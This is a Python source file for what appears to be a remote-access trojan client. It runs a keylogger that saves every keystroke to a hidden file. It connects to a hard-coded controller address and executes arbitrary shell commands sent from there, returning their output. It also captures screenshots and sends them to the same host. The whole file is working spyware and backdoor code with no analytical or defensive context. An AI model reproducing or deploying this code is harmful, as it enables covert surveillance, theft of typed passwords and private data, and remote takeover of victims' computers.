from pynput.keyboard import Key, Listener
import socket, subprocess, threading, pyautogui, datetime
import sendss, time, os

def start_keylogging():
    def on_press(key):
        f = open(".keylog", "a")
        if str(key).split(".")[0] == "Key":
            f.write("\n" + str(key).split(".")[1] + "\n")
        else:
            f.write(str(key))

    with Listener(on_press = on_press, on_release = None) as listener:
        listener.join()

def start_client():
    #HOST = "192.168.24.5"
    HOST = "172.16.120.153"
    PORT = 20030

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((HOST, PORT))
    while True:
        data = s.recv(1024)
        if data.decode() == "":
            break
        c = data.decode().split()
        if c[0] == "exec":
            binp = " ".join(c[1:])
            open("tempBash.sh", "w").write(binp + " > bashOutput")
            os.system("./tempBash.sh")
            output = open("bashOutput", "rb").read()
            if output:
                s.send(output)
            else:
                s.send(b"OK")
        elif c[0] == "getss":
            s.send(b"got it")
            #def s():
            ss = pyautogui.screenshot()
            ss.save("screenShots/secret.png")
            print("saved..")
            sender = sendss.dedess(HOST, 6677)
            print("sending..")
            sender.send()

            '''t = threading.Thread(target = s)
            t.start()
            t.join()'''

        else:
            s.send(b"OK")

        print(c)

if __name__ == "__main__":

    open("tempBash.sh", "w")
    open("bashOutput", "w")
    os.system("chmod +x tempBash.sh")

    t1 = threading.Thread(target = start_keylogging)
    t2 = threading.Thread(target = start_client)

    t1.start()
    t2.start()

    t1.join()
    t2.join()